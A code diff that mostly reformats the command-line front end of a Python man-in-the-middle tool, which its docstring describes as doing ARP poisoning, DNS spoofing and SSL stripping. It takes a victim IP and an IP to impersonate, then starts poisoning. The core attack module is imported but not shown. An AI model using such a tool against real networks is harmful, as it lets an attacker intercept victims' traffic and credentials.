@@ -5,16 +5,20 @@ Accepts command-line arguments and starts the ARP poisoning/DNS sspoofing/SSl st
 
 import time
 import click
-from arp_poisoner import ARPPoisoner
+from arp_poisoner import ARPPoisoner, listen
 from network_utils import get_interface_info
 
 
 @click.command()
 @click.option("--victim-ip", required=True, help="IP address of the victim.")
-@click.option("--target-ip", required=True,
-              help="IP address of the host you want to impersonate (gateway/website).")
-@click.option("--interface", "-i",
-              help="Network interface to use (default: auto-detect).")
+@click.option(
+    "--target-ip",
+    required=True,
+    help="IP address of the host you want to impersonate (gateway/website).",
+)
+@click.option(
+    "--interface", "-i", help="Network interface to use (default: auto-detect)."
+)
 def main(victim_ip, target_ip, interface):
     """
     Handles CLI input, sets up the interface, and launches the ARP MITM attack.
@@ -31,8 +35,13 @@ def main(victim_ip, target_ip, interface):
         target_ip=target_ip,
     )
     arp.start()
-    
-    click.echo(click.style(f"[+] ARP poisoning started between {victim_ip} <-> {target_ip}", fg="magenta"))
+
+    click.echo(
+        click.style(
+            f"[+] ARP poisoning started between {victim_ip} <-> {target_ip}",
+            fg="magenta",
+        )
+    )
     click.echo("[+] Press CTRL+C to stop and restore ARP tables.")
 
     try:
